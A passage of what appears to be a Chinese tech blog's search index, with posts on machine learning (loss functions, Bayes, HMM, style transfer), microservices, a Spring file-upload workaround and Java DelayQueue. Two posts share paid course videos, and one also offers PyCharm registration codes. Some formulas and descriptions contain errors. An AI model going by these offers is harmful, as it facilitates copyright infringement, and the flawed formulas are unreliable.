最近一个月，会利用之前的学习资料，并按照下面的技术图谱，开始大数据进阶之旅。随着学习深入，会将新写的文章链接汇入图谱相关知识点中。脑图持续更新，访问地址：https://www.processon.com/view/link/58a81160e4b0669d9957a433","link":"/2017/02/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%BF%9B%E9%98%B6%E8%AE%A1%E5%88%92/"},{"title":"开博这件事","text":"本人有点懒，不太喜欢用脑子刻意去记一些东西。但是东西多了易忘，怕忘，所以工作中逐渐养成了记录的习惯。我用的是有道云，那里按类别记录了我最近几年的工作所得。可是随着内容增多，慢慢发现了一个问题：有些知识记下了，仍然不是你的。 我知道记录能给我带来巨大好处，白底黑字会不断的通过视觉刺激来提醒我它的存在让我不必花大力气去刻意记忆曾经所学所想，而只需腾出精力对所记内容进行补充完善。 可惜行动总跟不上思维的节奏，稍有懈怠，记录便纯粹为了记录而记录。在微信公众号上看到一篇技术文章，有时觉得挺好，随手就记录到了有道云。可大多时候，这个过程没有思考，没有总结，好像就只是看了一个故事。 孔子有云: 学而不思则罔，思而不学则殆。当你记录的某个知识点，后期不断查看却还总是模棱两可的时候，就要反思了。 然后我就想到了开博这件事，开博意味着公开，公开意味着分享。分享会让我不可避免的去思考和总结，去写出让人眼前一亮的东西。 最近在云栖社区看了一篇文章，里面谈到程序员怎么提升自身价值，程序员的影响力一般体现在: 12345678910对内：在小组内部你技术最牛，小伙伴们有各种疑难杂症解决不了的时候都会想到你。产品对你非常有信心，给你的需求你都能高度。你经常主动给小伙伴们分享新技术、新东西，小伙伴知道的你都知到，小伙伴不知道的你也知道。对外：你参与过知名产品的架构开发，对外参加分享会。你是某个牛逼开源组件的作者。你写过某方面技术类书。你的博客比较有名，有很多粉丝。 看起来很难，但是知道目标了，怎么做就明确很多了。文章的建议大致是，挑战各种疑难杂症，经常总结；多回头整理项目代码，沉淀公用组建；多读书，提高视野；经常写博客，总结梳理知识；多画思维导图、技术图谱，把知识都串起来； 所以我希望开博对我是一个好的开端。教是最好的学，积极分享，大家共勉。","link":"/2016/04/15/%E5%BC%80%E5%8D%9A%E8%BF%99%E4%BB%B6%E4%BA%8B/"},{"title":"微信公众号开发","text":"最近进行了微信公众号的预研，目前支持的功能如下 支持关键字回复，目前能回复图文信息。 支持自定义菜单创建及菜单事件响应。 支持各消息类型的识别。目前可以识别用户发送的文本、图片、声音、地址和链接信息等。 支持拍照答题。微信公众号内带拍照功能，用户发送图片后，后端可调用接口进行图片识别，并回复图文信息。 通过点击菜单，目前可以进入自定义页面。后期前端可以介入进行相关HTML5开发。 支持用户信息的获取。后期可以进行个性化业务处理。 支持用户分组查询、用户分组创建、用户分组修改等。 支持临时/永久带参二维码的创建。 支持媒体文件的上传与下载。 项目实现比较简单，使用的是servlet，没有使用其他架构和多余代码，用户可以直接查看核心业务类CoreService。Github地址：https://github.com/Wasim37/weixin_demo.git (持续更新中)","link":"/2016/12/07/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E5%BC%80%E5%8F%91/"},{"title":"微服务学习资料共享","text":"技术应用背景介绍微服务是一种软件架构风格，它是以专注于单一责任与功能的小型功能区块为基础，利用模组化的方式组合出复杂的大型应用程序，各功能区块使用与语言无关的 API 集相互通讯；微服务架构设计风格代表了下一代的架构设计思想，配合现在的容器工具（如Docker），可以在软件开发流程、部署、服务维护等各方面产生新的生产效率提升；通过微服务可以更好地体现业务逻辑、更快地交付软件，并且借助IAAS平台，能够快速地扩展服务支撑更大的访问流量压力。 课程内容简介课程以架构设计历史简述为始，结合常用技术框架及工具帮助学员快速上手实现第一个微服务，再通过微服务实践过程中需要注意的数据模型、服务间通信等来进行多个微服务的设计实践，最后从测试、部署的角度来叙述在微服务最后上线及维护的相关事宜；课程将从“初始微服务”来简述服务架构设计风格的发展历程和微服务的由来；通过“Java与微服务”来介绍常用的快速上手Java微服务技术框架；通过“微服务间关系”、“数据模型设计与处理”、“微服务安全加固”课程来详细阐述微服务在实战过程中的原则和技巧；通过“微服务测试”、“微服务部署”、“微服务与虚拟化、容器化”课程来帮助学员掌握微服务测试到最后上线及服务的实践。 课程标题跟我做一个Java微服务实战项目 讲师介绍9年以上互联网/移动互联网开发经验，6年以上技术管理经验，擅长移动App和Web网站研发管理、项目管理，负责过千万级用户社交产品的技术架构体系建设；经历过Web 2.0及移动互联网创业浪潮，曾任创业公司技术负责人，从零构建技术团队完善技术架构并成功支撑亿级请求，现任迅雷技术总监；早期全栈工程师，带过移动客户端、服务端、大数据分析、运维、智能硬件团队，对于开源项目了解、对于新技术和技术趋势有着良好的理解；对于如何在创业公司及成熟公司内带领研发团队进行敏捷开发和研发流程优化有着自己的方法，对于如何进行研发团队建设有着良好的经验，对于如何进行架构优化来适应快速增长的流量有着丰富的实战经验。 课程大纲整个课程将由一个示例项目——eMall贯穿，eMall是一个示例的在线商城项目，通过这个项目学员可以以实践的方式来掌握微服务构建技巧。 第一节：初始微服务 服务架构设计发展概述 微服务简介 服务的独立性与自主性 服务的弹性与容错性 自动化环境 示例项目eMall介绍 第二节：Java与微服务 Java微服务常用框架 Spring Boot Dropwizard J2EE (Java Platform, Enterprise Edition) 版本依赖关系工具 Apache Maven Gradle 其它工具 如何设计服务 领域驱动设计原则 将领域元素转换为微服务 应用与服务架构 创建RESTful API 课后习题 【操作练习题】Git、Maven工具安装 【操作练习题】使用Dropwizard、Spring Boot创建eMall项目微服务 第三节：微服务间关系 服务注册与发现 服务调用 服务间通信 课后习题 【操作练习题】使用Zookeeper作为服务发现 【操作练习题】使用Consul作为服务发现 第四节：数据模型设计与处理 微服务数据定义 从领域设计到实体 数据的持久性 跨服务数据共享 CQRS 消息系统与协议 消息系统 常用协议 课后习题 【操作练习题】使用Kafka作为消息系统 【思考题】有哪些常用开源消息系统，适用场景有哪些？ 第五节：微服务安全加固 网络分隔 数据私密性保证 身份识别与信任 课后习题 【操作练习题】HMAC、API密钥识别方式的实现 【思考题】深度防御该如何做？ 第六节：微服务测试 测试分类 不同环境下的测试 单服务测试 预生产环境测试 生产环境测试 课后习题 【操作练习题】使用Mock工具进行测试 【思考题】测试与研发过程的衔接时机问题 第七节：微服务部署 自动化工具 应用打包 JAR、WAR、EAR？ 容器化 应用打包的最佳实践 应用配置 提升运维友好度 度量指标与健康检测 日志管理 课后习题 【操作练习题】将应用配置与应用程序分隔开的WAR包 【思考题】微服务依赖部署关系该如何解决？ 【思考题】灰度发布该如何来做？ 第八节 I：微服务与虚拟化、容器化 Linux虚拟化简介 常见虚拟化方案介绍 虚拟化与Java微服务实践 Linux容器简介 Docker介绍 Docker与Java微服务实践 课后习题 【操作练习题】构建eMall项目的Docker部署镜像 第八节 Part II：微服务应对高并发实践 拥抱故障 容量规划 功能降级 高扩展性 自动伸缩 【思考题】什么样的状况下不应该使用微服务？ 图片相关 链接相关资料（代码、课件、软件、视频等）：http://pan.baidu.com/s/1i5snPmX由于是付费视频，不能随意传播，所以视频密码未公开，不过对资料感兴趣的可以在下方留下邮件地址，我会定期进行密码发送。","link":"/2017/03/10/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%85%B1%E4%BA%AB/"},{"title":"损失函数和成本函数","text":"损失函数针对的是单个样本，代价函数或者成本函数针对的是全体样本。 逻辑回归Logistic 回归是一个用于二分分类的算法。 Logistic 回归中使用的参数如下： 输入的特征向量：$x \\in R^{n_x}$，其中 ${n_x}$ 是特征数量； 用于训练的标签：$y \\in 0,1$ 权重：$w \\in R^{n_x}$ 偏置： $b \\in R$ 输出：$\\hat{y} = \\sigma(w^Tx+b)$ Sigmoid 函数：s = \\sigma(w^Tx+b) = \\sigma(z) = \\frac{1}{1+e^{-z}} 为将 wTx+b 约束在 [0, 1] 间，引入 Sigmoid 函数。从下图可看出，Sigmoid 函数的值域为 [0, 1]。 Logistic 回归可以看作是一个非常小的神经网络。下图是一个典型例子： 损失函数（loss function）用于衡量预测结果与真实值之间的误差。 最简单的损失函数定义方式为均方平方差损失： L(\\hat{y},y) = \\frac{1}{2}(\\hat{y}-y)^2平方差很好理解，预测值与真实值直接相减，为了避免得到负数取绝对值或者平方，再做平均就是均方平方差。 但 Logistic 回归中我们并不倾向于使用这样的损失函数，因为之后讨论的优化问题会变成非凸的，最后会得到很多个局部最优解，梯度下降法可能找不到全局最优值。 损失函数一般使用： L(\\hat{y},y) = -(y\\log\\hat{y})-(1-y)\\log(1-\\hat{y})损失函数是在单个训练样本中定义的，它衡量了在单个训练样本上的表现。而代价函数（cost function，或者称作成本函数）衡量的是在全体训练样本上的表现，即衡量参数 w 和 b 的效果。 J(w,b) = \\frac{1}{m}\\sum_{i=1}^mL(\\hat{y}^{(i)},y^{(i)})逻辑回归参数迭代推导：http://blog.csdn.net/oldbai001/article/details/49872433http://blog.csdn.net/programmer_wei/article/details/52072939 Softmax 回归二分类问题，神经网络输出层通常只有一个神经元，表示预测输出 $\\hat y$是正类的概率 P(y = 1|x)，$\\hat y$ &gt; 0.5 则判断为正类，反之判断为负类。 对于多分类问题，用 C 表示种类个数，则神经网络输出层，也就是第 L 层的单元数量 $n^{[L]} = C$。每个神经元的输出依次对应属于该类的概率，即 $P(y = c|x), c = 0, 1, .., C-1$。有一种 Logistic 回归的一般形式，叫做Softmax 回归，可以处理多分类问题。 对于 Softmax 回归模型的输出层，即第 L 层，有： Z^{[L]} = W^{[L]}a^{[L-1]} + b^{[L]}for i in range(L)，有： a^{[L]}_i = \\frac{e^{Z^{[L]}_i}}{\\sum^C_{i=1}e^{Z^{[L]}_i}}为输出层每个神经元的输出，对应属于该类的概率，满足： \\sum^C_{i=1}a^{[L]}_i = 1一个直观的计算例子如下： 定义 损失函数 为： L(\\hat y, y) = -\\sum^C_{j=1}y_jlog\\hat y_j当 i 为样本真实类别，则有： y_j = 0, j \\ne i因此，损失函数可以简化为： L(\\hat y, y) = -y_ilog\\hat y_i = log \\hat y_i所有 m 个样本的 成本函数 为： J = \\frac{1}{m}\\sum^m_{i=1}L(\\hat y, y) SVM 神经网络","link":"/2018/01/05/%E6%8D%9F%E5%A4%B1%E5%87%BD%E6%95%B0%E5%92%8C%E6%88%90%E6%9C%AC%E5%87%BD%E6%95%B0/"},{"title":"机器学习资料共享","text":"链接相关资料（课件、代码）：http://pan.baidu.com/s/1mh8fuZm 密码：j7zf软件（pycharm、注册码等）：http://pan.baidu.com/s/1o8GyXkQ 密码：n2jg视频（机器学习）：http://pan.baidu.com/s/1sl0JMJr这是最近买的付费教程，对资料感兴趣的可以在下方留下邮件地址，我会定期进行密码发送。 教程课表第1 章 ： 参课须知课时1：参课须知 第2 章 ： 第一周课件资料和视频课时2：1.机器学习中的数学课时3：1.机器学习中的数学（视频） 144:28课时4：第一次作业课时5：2.Python库课时6：2.Python库（视频） 151:15课时7：第二次作业课时8：3.回归课时9：3.回归(视频) 143:06课时10：第三次作业 第3 章 ： 第二周课件资料和视频课时11：4.回归实践课时12：4. 回归实践（视频） 133:39课时13：第四次作业课时14：5.决策树和随机森林课时15：5.决策树和随机森林（视频） 143:57课时16：第五次作业课时17：6.决策树和随机森林实践课时18：第六次作业课时19：6.决策树和随机森林实践 143:51 第4 章 ： 第三周课件资料和视频课时20：7.提升课时21： 7.提升 150:16课时22：8.提升实践课时23：8.提升实践 154:50课时24：9.SVM课时25：9.SVM 140:49 第5 章 ： 第四周课件资料和视频课时26：10.SVM实践课时27：10.SVM实践 170:05课时28：11.聚类课时29：11. 聚类（视频） 162:48课时30：12.聚类实践课时31：12.聚类实践（视频） 159:02 第6 章 ： 第五周课件资料和视频课时32：13.EM算法课时33：13.EM算法（视频） 169:44课时34：14.EM算法实践课时35：14.EM算法实践（视频） 140:30课时36：15.主题模型课时37：15. 主题模型 168:23 第7 章 ： 第六周课件资料和视频课时38：16.主题模型实践课时39：16.主题模型实践（视频） 158:32课时40：17.HMM课时41：17.HMM 164:50课时42：18.HMM实践课时43：附：股票预测课时44：HMM实践（视频） 160:27课时45：机器学习升级版实验手册 课件与代码","link":"/2017/03/15/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%85%B1%E4%BA%AB/"},{"title":"机器学习（七）：主题模型","text":"持续更新中。。。 simhash与重复信息识别：http://grunt1223.iteye.com/blog/964564","link":"/2017/10/28/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89%EF%BC%9A%E4%B8%BB%E9%A2%98%E6%A8%A1%E5%9E%8B/"},{"title":"机器学习（五）：贝叶斯算法","text":"持续更新中。。。 示例代码 贝叶斯定理相关公式 条件概率和后验概率区别 朴素贝叶斯 高斯朴素贝叶斯 伯努利朴素贝叶斯 多项式朴素贝叶斯 贝叶斯网络 怎么通俗易懂地解释贝叶斯网络和它的应用 用贝叶斯机率说明Dropout的原理 如何用贝叶斯算法实现垃圾邮件检测 当你输入错误单词时，搜索引擎会进行拼写检查并提示正确单词，如何用贝叶斯算法实现相关逻辑 贝叶斯定理相关公式 先验概率P(A)：在不考虑任何情况下，A事件发生的概率 条件概率P(B|A)：A事件发生的情况下，B事件发生的概率 后验概率P(A|B)：在B事件发生之后，对A事件发生的概率的重新评估。条件概率和后验概率区别 全概率：如果B和B’构成样本空间的一个划分，那么事件A的概率为：B和B’的概率分别乘以A对这两个事件的概率之和。 贝叶斯定理： P(B_i|A)=\\frac{P(AB_i)}{P(A)}=\\frac{P(B_i)P(A|B_i)}{\\sum_j P(B_j)P(A|B_j)} 贝叶斯不同于SVM、逻辑回归与决策树等判别式模型，它属于生成式模型（LDA、HMM等）。贝叶斯思想可以概括为先验概率+数据=后验概率，后验概率就是我们要求的。 朴素贝叶斯朴素贝叶斯模型(Naive Bayesian Model)的朴素(Naive)的含义是很简单地假设样本特征彼此独立. 这个假设现实中基本上不存在， 但特征相关性很小的实际情况还是很多， 所以很多时候这个模型仍然能够工作得很好。 如果样本特征属性关联很大，朴素贝叶斯就没法很好解决这类问题，可以考虑使用贝叶斯网络。 高斯朴素贝叶斯Gaussian Naive Bayes是指当 特征属性为连续值时，而且分布服从高斯分布，那么在计算 P(x|y) 的时候可以直接使用高斯分布的概率公式： 因此只需要计算出各个类别中此特征项划分的各个均值和标准差 伯努利朴素贝叶斯Bernoulli Naive Bayes是指当 特征属性为连续值时，而且分布服从伯努利分布，那么在计算 P(x|y) 的时候可以直接使用伯努利分布的概率公式： 伯努利分布是一种离散分布，只有两种可能的结果。1表示成功，出现的概率为p；0表示失败，出现的概率为q=1-p；其中均值为E(x)=p，方差为Var(X)=p(1-p) 多项式朴素贝叶斯Multinomial Naive Bayes是指当 特征属性服从多项分布，从而对于每个类别y，参数为θy =(θy1, θy2,…,θyn)，其中n为特征属性数目，那么P(xi|y)的概率为θyi 贝叶斯网络当多个特征属性之间存在着某种相关关系的时候，使用朴素贝叶斯算法就没法解决这类问题，那么贝叶斯网络就是解决这类应用场景的一个非常好的算法。 把某个研究系统中涉及到的随机变量，根据是否条件独立绘制在一个有向图中，就形成了贝叶斯网络。 贝叶斯网络(BN)，又称有向无环图模型，是一种概率图模型，根据概率图的拓扑结构，考察一组随机变量{X1, X2,…,Xn}及其N组条件概率分布的性质。 一般而言，贝叶斯网络的有向无环图中的节点表示随机变量，可以是可观察到的变量，或隐变量，未知参数等等。连接两个节点之间的箭头代表两个随机变量之间的因果关系(也就是这两个随机变量之间非条件独立)，如果两个节点间以一个单箭头连接在一起，表示其中一个节点是“因”，另外一个是“果”，从而两节点之间就会产生一个条件概率值。 注意：每个节点在给定其直接前驱的时候，条件独立于其后继。 更多细节见我整理的PDF文件。 如何用贝叶斯算法实现垃圾邮件检测 首先通过相除消去分子，大于1即正样本，小于1即负样本。然后将难以计算的联合分布概率P(y=T|x)和P(y=F|x)进行转换即可。 下面是另外两种解释： 原文：https://github.com/SunnyMarkLiu/NaiveBayesSpamFilter 原文：https://blog.csdn.net/Gane_Cheng/article/details/53219332 当你输入错误单词时，搜索引擎会进行拼写检查并提示正确单词，如何用贝叶斯算法实现相关逻辑","link":"/2017/10/26/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89%EF%BC%9A%E8%B4%9D%E5%8F%B6%E6%96%AF%E7%AE%97%E6%B3%95/"},{"title":"机器学习（八）：隐马尔科夫模型","text":"持续更新中。。。 示例代码 贝叶斯网络、马尔科夫网络、EM、条件随机场、最大熵模型的联系 贝叶斯网络、马尔科夫网络、EM、条件随机场、最大熵模型的联系1、将随机变量作为结点，若两个随机变量相关或者不独立，则将二者连接一条边；若给定若干随机变量，则形成一个有向图，即构成一个网络。2、如果该网络是有向无环图，则这个网络称为贝叶斯网络。3、如果这个有向图的拓扑结构退化成线性链的形式，则得到马尔科夫模型；因为每个结点都是随机变量，将其看成各个时刻(或空间)的相关变化，以随机过程的视角，则可以看成是马尔科夫过程。4、若上述网络是无向的，则称为概率无向图模型，又称马尔科夫随机场。5、如果在给定某些条件的前提下，研究这个马尔科夫随机场，则得到条件随机场。6、如果使用条件随机场解决标注问题，并且进一步将条件随机场中的网络拓扑变成线性的，则得到线性链条件随机场。 变量 + 依赖关系 —&gt; 概率图网络 概率有向图 贝叶斯网络 马尔科夫过程 一阶马尔科夫链 马尔科夫模型 概率无向图（马尔科夫随机场） 条件随机场 线性链条件随机场 生成式模型对联合分布概率p(x,y)进行建模，判别式模型直接对条件概率p(y|x)进行建模。 贝叶斯网络又称信度网络或信念网络，是一个有向无环图。它的理论基础是贝叶斯公式。 朴素贝叶斯基于贝叶斯定理与特征条件独立假设。 概率无向图模型又称马尔科夫随机场，是一个可以由无向图表示的联合概率分布 随机过程又称为随机函数，是随时间而随机变化的过程。 马尔科夫性质：可以简单理解为将来与现在有关，与过去无关 HMM的预测问题又称为解码问题，它的学习问题可以用EM算法解决。 最大熵模型：满足已知条件的所有概率模型中，熵最大的模型就是最好的模型。 条件随机场与最大熵模型都是指数模型，CRF的求解借鉴了最大熵的思想 只要可以转换为 序列标注 的问题，都可以用HMM、CRF和 MEMM（最大熵隐马尔科夫模型）解决","link":"/2017/10/29/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AB%EF%BC%89%EF%BC%9A%E9%9A%90%E9%A9%AC%E5%B0%94%E7%A7%91%E5%A4%AB%E6%A8%A1%E5%9E%8B/"},{"title":"机器学习（六）：EM","text":"持续更新中。。。 示例代码","link":"/2017/10/27/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89%EF%BC%9AEM/"},{"title":"根据源码用HttpServletRequest获取MultipartFile的问题","text":"问题由于某些原因，现在需要这样的一个文件上传接口，这个接口type(String)是必传参数，photoFile(MultipartFile)是非必传参数，即一般情况下需要接受两个参数，分别为photoFile和type，但是偶尔只接受type参数，不需要起到上传作用。 按常规写法，photoFile参数的required配置设置为了false。 奈何调试时发现，photoFile的required配置是失效的。即下面的接口写法，photoFile成了必传参数。 123456@ResponseBody@RequestMapping(value = \"/upload\")public String uploadPics(@RequestPart(value = \"photoFile\", required = false) MultipartFile photoFile, @RequestParam(value = \"type\", required = true) String type, HttpServletRequest request) throws Exception { 。。。} 当模拟upload接口请求时，如果不携带photoFile参数，如上接口写法报错如下123456789101112org.springframework.web.multipart.MultipartException: The current request is not a multipart request at org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE] ... 方案required配置失效，估计是没有走required的相关流程。我们根据所报的第三行错误，进入RequestPartMethodArgumentResolver.class的源码的116行查看。123456789101112131415161718111 @Override112 public Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,113 NativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {114115 HttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);116 assertIsMultipartRequest(servletRequest);117118 MultipartHttpServletRequest multipartRequest =119 WebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);120121 String partName = getPartName(parameter);122 Object arg;123124 if (MultipartFile.class.equals(parameter.getParameterType())) {125 Assert.notNull(multipartRequest, \"Expected MultipartHttpServletRequest: is a MultipartResolver configured?\");126 arg = multipartRequest.getFile(partName); } ..... 再点击116行，进入assertIsMultipartRequest方法123456175 private static void assertIsMultipartRequest(HttpServletRequest request) {176 String contentType = request.getContentType();177 if (contentType == null || !contentType.toLowerCase().startsWith(\"multipart/\")) {178 throw new MultipartException(\"The current request is not a multipart request\");179 } } 很明显，错误就是178行触发的。而且在上层的几个调用中也没有涉及到required的流程。那么问题来了, 接口偶尔需要起到上传作用，如果不改变接口传参形式，就只能改源码了，很明显，这不是好的方案。 那答案肯定就在源码里了，我们很容易就想到可以在接口处完全去掉photoFile(MultipartFile)参数，然后把模仿源码，从request里去获取MultipartFile对象。 下面是根据源码118-126行、176-179行修改的接口，经测试是可行的： 123456789101112131415@ResponseBody@RequestMapping(value = \"/upload\")public String uploadPics(@RequestParam(value = \"type\", required = true) String type, HttpServletRequest request) { .... // 检测是否为上传请求 String contentType = request.getContentType(); if (contentType != null &amp;&amp; contentType.toLowerCase().startsWith(\"multipart/\")) { MultipartHttpServletRequest multipartRequest = WebUtils.getNativeRequest(request, MultipartHttpServletRequest.class); MultipartFile file = multipartRequest.getFile(\"file\"); .... } ....}后记问题的处理其实很简单，但是这边文章的记录是为了另一件事。 当时实现这个功能时，发现常规写法走不通，又不好改源码，内心是有草泥马奔腾而过的。 知道答案可能在源码里，猜想可以去用request获取MultipartFile对象，但是又觉得麻烦，不想去干这事，想着可能有更好的办法，然后这事就拖着。 到后来问同事怎么解决，同事说那就从request获取MultipartFile对象咯。:-O 其实工作经常碰到这类事情，但是很多时候那些 “貌似遥远的路途” 才是真正的捷径 ~","link":"/2016/11/10/%E6%A0%B9%E6%8D%AE%E6%BA%90%E7%A0%81%E7%94%A8HttpServletRequest%E8%8E%B7%E5%8F%96MultipartFile%E7%9A%84%E9%97%AE%E9%A2%98/"},{"title":"目标检测流行算法总结","text":"","link":"/2018/07/20/%E7%9B%AE%E6%A0%87%E6%A3%80%E6%B5%8B%E6%B5%81%E8%A1%8C%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/"},{"title":"神经风格转移","text":"简介神经风格迁移（Neural style transfer）将参考风格图像的风格“迁移”到另外一张内容图像中，生成具有其特色的图像。 相关链接： 代码示例 fast-style-transfer github项目 深度卷积网络在学什么？想要理解如何实现神经风格转换，首先要理解在输入图像数据后，一个深度卷积网络从中都学到了些什么。我们借助可视化来做到这一点。 我们通过遍历所有的训练样本，找出使该层激活函数输出最大的 9 块图像区域。可以看出，浅层的隐藏层通常检测出的是原始图像的边缘、颜色、阴影等简单信息。随着层数的增加，隐藏单元能捕捉的区域更大，学习到的特征也由从边缘到纹理再到具体物体，变得更加复杂。 相关论文：Zeiler and Fergus., 2013, Visualizing and understanding convolutional networks 代价函数神经风格迁移生成图片 G 的代价函数如下： J(G) = \\alpha \\cdot J_{content}(C, G) + \\beta \\cdot J_{style}(S, G)其中，$α$、$β$ 是用于控制相似度比重的超参数。 神经风格迁移的算法步骤如下： 随机生成图片 G 的所有像素点； 使用梯度下降算法使代价函数最小化，以不断修正 G 的所有像素点。 相关论文：Gatys al., 2015. A neural algorithm of artistic style 内容代价函数上述代价函数包含一个内容代价部分和风格代价部分。我们先来讨论内容代价函数 $J_{content}(C, G)$，它表示内容图片 C 和生成图片 G 之间的相似度。 $J_{content}(C, G)$ 的计算过程如下： 使用一个预训练好的 CNN（例如 VGG）； 选择一个隐藏层 l 来计算内容代价。l 太小则内容图片和生成图片像素级别相似，l 太大则可能只有具体物体级别的相似。因此，l 一般选一个中间层； 设 a(C)[l]、a(G)[l] 为 C 和 G 在 l 层的激活，则有： J_{content}(C, G) = \\frac{1}{2}||(a^{(C)[l]} - a^{(G)[l]})||^2$a^{(C)[l]}$ 和 $a^{(G)[l]}$ 越相似，则 $J_{content}(C, G)$ 越小。 风格代价函数 每个通道提取图片的特征不同，比如标为红色的通道提取的是图片的垂直纹理特征，标为黄色的通道提取的是图片的橙色背景特征。那么计算这两个通道的相关性，相关性的大小，即表示原始图片既包含了垂直纹理也包含了该橙色背景的可能性大小。通过 CNN，“风格”被定义为同一个隐藏层不同通道之间激活值的相关系数，因其反映了原始图片特征间的相互关系。 对于风格图像 S，选定网络中的第 l 层，则相关系数以一个 gram 矩阵的形式表示： 其中，$i$ 和 $j$ 为第 $l$ 层的高度和宽度；$k$ 和 $k′$ 为选定的通道，其范围为 1 到 $nC^{[l]}$；$a^{l}{ijk}$ 为激活。 同理，对于生成图像 G，有： 因此，第 $l$ 层的风格代价函数为： 如果对各层都使用风格代价函数，效果会更好。因此有： J_{style}(S, G) = \\sum_l \\lambda^{[l]} J^{[l]}_{style}(S, G)其中，$lambda$ 是用于设置不同层所占权重的超参数。 推广至一维和三维之前我们处理的都是二维图片，实际上卷积也可以延伸到一维和三维数据。我们举两个示例来说明。 EKG 数据（心电图）是由时间序列对应的每个瞬间的电压组成，是一维数据。一般来说我们会用 RNN（循环神经网络）来处理，不过如果用卷积处理，则有： 输入时间序列维度：14 x 1 滤波器尺寸：5 x 1，滤波器个数：16 输出时间序列维度：10 x 16 而对于三维图片的示例，有 输入 3D 图片维度：14 x 14 x 14 x 1 滤波器尺寸：5 x 5 x 5 x 1，滤波器个数：16 输出 3D 图片维度：10 x 10 x 10 x 16","link":"/2018/01/27/%E7%A5%9E%E7%BB%8F%E9%A3%8E%E6%A0%BC%E8%BD%AC%E7%A7%BB/"},{"title":"自动化部署脚本","text":"持续更新中 ~~ 地址：https://github.com/Wasim37/deployment-scripts/","link":"/2016/11/12/%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E8%84%9A%E6%9C%AC/"},{"title":"自定义二维码","text":"二维码不一定是单调的黑白格子，也可以很丰富。 最近用到的二维码在线生成网站： 二维工坊：http://visual.2weima.com/ 云来图形二维码：http://qrcode.yunlai.cn/ 我给”星空博客”网站生成的二维码： 生成的动图二维码如果较大，需要进行相关压缩，不然页面加载比较慢压缩工具：http://www.jb51.net/softs/107350.html 关于二维码更多详情，可以去知乎上查找，输入”二维码”即可 图文并茂，介绍的非常详细，比如下面这篇文章二维码怎么才会让人有扫的冲动：https://www.zhihu.com/question/21546400","link":"/2016/05/14/%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8C%E7%BB%B4%E7%A0%81/"},{"title":"DelayQueue使用","text":"假设现有如下的使用场景：a) 关闭空闲连接。服务器中，有很多客户端的连接，空闲一段时间之后需要关闭之。b) 缓存。缓存中的对象，超过了空闲时间，需要从缓存中移出。c) 任务超时处理。在网络协议滑动窗口请求应答式交互时，处理超时未响应的请求。 笨办法是，使用一个后台线程，遍历所有对象，挨个检查。但对象数量过多时，存在性能问题，检查间隔时间不好设置，间隔时间过大，影响精确度，多小则存在效率问题。而且做不到按超时的时间顺序处理。 这场景，使用DelayQueue最适合了。Delayed 元素的一个无界阻塞队列，只有在延迟期满时才能从中提取元素。该队列的头部是延迟期满后保存时间最长的Delayed元素（即最想优先处理的元素）。如果延迟都还没有期满，则队列没有头部，并且 poll 将返回 null。当一个元素的 getDelay(TimeUnit.NANOSECONDS) 方法返回一个小于等于 0 的值时，将发生到期。即使无法使用take或poll移除未到期的元素，也不会将这些元素作为正常元素对待。例如，size方法同时返回到期和未到期元素的计数。此队列不允许使 null元素。 DelayQueue队列中保存的是实现了Delayed接口的实现类，里面必须实现getDelay()和compareTo()方法。前者用于取DelayQueue里面的元素时判断是否到了延时时间，否则不予获取，是则获取。 compareTo()方法用于进行队列内部的排序。compareTo 方法需提供与 getDelay 方法一致的排序。 DelayQueue = BlockingQueue + PriorityQueue + DelayedPriorityBlockingQueue = BlockingQueue + 